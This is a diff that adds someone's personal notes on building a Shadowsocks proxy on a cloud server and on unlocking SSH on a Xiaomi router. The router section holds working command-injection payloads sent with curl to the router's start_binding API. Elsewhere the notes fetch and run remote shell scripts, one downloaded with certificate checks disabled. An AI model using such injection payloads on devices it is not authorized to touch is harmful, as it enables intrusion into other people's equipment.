@@ -202,3 +202,142 @@ https://check.torproject.org/
 
 
 
+
+
+
+
+指导文档：
+
+https://iyideng.org/black-technology/cgfw/shadowsocks-ss-server-building-and-using-tutorial.html
+
+
+
+
+
+https://cloud.digitalocean.com/droplets/468982185/access?i=d8822d
+
+209.38.78.253
+
+![image-20250111010457596](max_proxy/image-20250111010457596.png)
+
+
+
+```
+wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh
+chmod +x shadowsocks-all.sh
+./shadowsocks-all.sh 2>&1 | tee shadowsocks-all.log
+```
+
+
+
+10000
+
+chacha20
+
+
+
+
+
+
+
+
+
+```
+apt-get -y install gettext build-essential unzip gzip python python-dev python-setuptools curl openssl libssl-dev autoconf automake libtool gcc make perl cpio libpcre3 libpcre3-dev zlib1g-dev libev-dev libc-ares-dev git qrencode
+```
+
+
+
+
+
+scp root@209.38.78.253:/root/shadowsocks_python_qr.png /Users/pei/Downloads
+
+scp root@209.38.78.253:/root//root/shadowsocks_r_qr.png /Users/pei/Downloads
+
+
+
+/var/log/shadowsocks.log
+
+```bash
+netstat -tuln | grep 1081
+apt install net-tools
+# 在某些版本的 Ubuntu 和 Debian 系统中，netstat 命令可能不再包含在默认的安装包中。netstat 已经被 ss 命令取代，但如果你仍然需要使用 netstat，可以通过安装 net-tools 包来获取它。
+
+```
+
+/etc/init.d/shadowsocks-python restart
+
+```
+Shadowsocks-Python 版：
+/etc/shadowsocks-python/config.json
+```
+
+```
+Shadowsocks-Python 版：
+/etc/init.d/shadowsocks-python start | stop | restart | status
+
+ShadowsocksR 版：
+/etc/init.d/shadowsocks-r start | stop | restart | status
+
+Shadowsocks-Go 版：
+/etc/init.d/shadowsocks-go start | stop | restart | status
+
+Shadowsocks-libev 版：
+/etc/init.d/shadowsocks-libev start | stop | restart | status
+```
+
+
+
+
+
+```bash
+ssh-keygen -t rsa -b 4096
+
+ssh-copy-id root@pei.work.gd
+ssh-copy-id root@209.38.78.253
+```
+
+![image-20250111120527320](max_proxy/image-20250111120527320.png)
+
+
+
+
+
+
+
+
+
+curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=4e96bb1702b66fefcee1d96d9eb04ff1/api/xqsystem/start_binding -d "uid=1234&key=1234'%0Anvram%20set%20ssh_en%3D1'"
+
+curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=4e96bb1702b66fefcee1d96d9eb04ff1/api/xqsystem/start_binding -d "uid=1234&key=1234'%0Anvram%20commit'"
+
+curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=4e96bb1702b66fefcee1d96d9eb04ff1/api/xqsystem/start_binding -d "uid=1234&key=1234'%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear'"
+
+curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=4e96bb1702b66fefcee1d96d9eb04ff1/api/xqsystem/start_binding -d "uid=1234&key=1234'%0A%2Fetc%2Finit.d%2Fdropbear%20start'"
+
+![image-20250111134643961](max_proxy/image-20250111134643961.png)
+
+
+
+
+
+nvram set ssh_en=1
+nvram set telnet_en=1
+nvram set uart_en=1
+nvram set boot_wait=on
+nvram commit
+sed -i 's/channel=.*$/channel="debug"/g' /etc/init.d/dropbear
+/etc/init.d/dropbear restart
+
+
+
+```text
+mkdir /data/auto_ssh && cd /data/auto_ssh
+curl -O https://fastly.jsdelivr.net/gh/lemoeo/AX6S@main/auto_ssh.sh
+chmod +x auto_ssh.sh
+```
+
+
+
+![image-20250111140117777](max_proxy/image-20250111140117777.png)
+
